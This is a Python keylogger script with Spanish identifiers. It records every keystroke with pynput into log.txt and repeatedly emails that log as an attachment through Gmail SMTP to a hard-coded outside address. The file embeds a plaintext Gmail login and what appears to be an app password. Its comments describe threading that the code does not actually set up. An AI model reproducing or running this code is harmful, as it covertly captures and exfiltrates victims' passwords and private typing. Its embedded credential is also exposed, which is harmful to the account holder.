from email.mime.application import MIMEApplication
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from pynput.keyboard import Key, Listener

import time

class Keylogger:
    def __init__(self):
        self.keys = []
        self.archivo_txt = "log.txt"

    def presionar_tecla(self, key):
        self.keys.append(key)
        self.convertir_string()

    def convertir_string(self):
        with open(self.archivo_txt, 'w') as logfile:
            for key in self.keys:
                key = str(key).replace("'", "")
                key = str(key).replace("Key.space", " ")
                key = str(key).replace("Key.ctrl_l", "")
                key = str(key).replace("Key.tab", "")
                key = str(key).replace("Key.alt", "")
                key = str(key).replace("Key.alt_gr", "")
                key = str(key).replace("Key.caps_lock", "")
                key = str(key).replace("Key.enter", "\n")
                logfile.write(key)

    def soltar_tecla(self, key):
        if key == Key.esc:
            return False

    def iniciar_keylogger(self):
        with Listener(on_press=self.presionar_tecla, on_release=self.soltar_tecla) as listener:
            listener.join()

    def enviar_correo(self):
        import smtplib
        import email.mime.base

        server = smtplib.SMTP('smtp.gmail.com', 587)
        correo = 'naranjotesteos@gmail.com'
        pas ='mewt orpm ppjg qdrw'
        remitente = "naranjotesteos@gmail.com"
        destinatario = "naranjo.developer@gmail.com"

        mensaje = MIMEMultipart()
        mensaje['From'] = remitente
        mensaje['To'] = destinatario
        mensaje['Subject'] = "Correo electrónico con archivo adjunto"

        cuerpo = "Hola,\n\nEste es un mensaje de prueba enviado desde Python con un archivo adjunto.\n\nSaludos,\n Kevin"
        mensaje.attach(MIMEText(cuerpo, 'plain'))

        ruta_archivo = 'log.txt'
        archivo = open(ruta_archivo, 'rb')
        adjunto = email.mime.base.MIMEBase('application', 'octet-stream')
        adjunto.set_payload(archivo.read())
        email.encoders.encode_base64(adjunto)
        adjunto.add_header('Content-Disposition', "attachment; filename= %s" % ruta_archivo)
        mensaje.attach(adjunto)

        texto = mensaje.as_string()

        server.starttls()
        server.login(correo, pas)
        server.sendmail(remitente, destinatario, texto)
        server.quit()

    def ejecutar(self):
        while True:
            self.enviar_correo()
            time.sleep(5)

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.iniciar_keylogger()  # Este método se ejecutará en un hilo diferente
    keylogger.ejecutar()  # Este método se ejecutará en el hilo principal